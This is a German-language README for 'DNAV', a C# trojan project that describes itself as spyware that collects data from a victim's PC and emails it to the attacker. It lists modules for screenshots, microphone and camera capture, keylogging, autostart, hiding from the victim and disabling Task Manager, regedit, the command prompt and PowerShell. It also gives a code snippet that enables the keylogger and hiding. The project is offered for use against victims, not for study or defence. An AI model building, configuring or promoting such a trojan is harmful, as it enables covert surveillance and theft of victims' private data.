# DNAV - Definitely Not A Virus
DNAV ist ein in C# entwickelter Trojaner, welcher Daten auf einem Opfer PC sammelt. Diese Daten werden per Email an den Angreifer übertragen.

## Entwicklungshinweise
**Der master branch enthält nur stabile releases.** Jeder contributor erhält einen eigenen branch, in dem beliebig gearbeitet werden kann. Wenn eine Funktion eines contributors fertig ist, wird der entsprechende branch in den development branch gemerged. Sollten alle geplanten Funktionen im development branch sein, wird der development branch in den master branch gemerged und ein Release erstellt.

## Funktionen
Zur Zeit soll DNAV folgende Funktionen umfassen:
- Erstellen von Screenshots
- Mikrofon- und Kameraaufnahme
- Keylogger
- Autostart
- Übertragen von Daten per Email
- Verstecken vor dem Opfer
- Deaktivieren von Systemtools:
	- Taskmanager
 	- Ausführen... Dialog
 	- Eingabeaufforderung
 	- Regedit
 	- Windows Taste
 	- Taskleiste
 	- Powershell

## Präferenzen
Um das Projekt zu compilieren, wird Visual Studio 2019 und das .NET Framework 4.7.2 vorausgesetzt.

[Visual Studio 2019 Download](https://visualstudio.microsoft.com/de/vs/)

## Verwendung
Die Konfiguration des Trojaners wird über ein DNAV Objekt vorgenommen. Dieses Objekt bietet Properties um die einzelnen Module zu aktivieren. Soll der Trojaner einen Keylogger beinhalten und sich vor dem Benutzer verstecken, kann dies durch foldenden Code erfolgen:
```
DNAV dnav = new DNAV();
dnav.Keylogger = true;
dnav.Hide = true;
dnav.Start();
```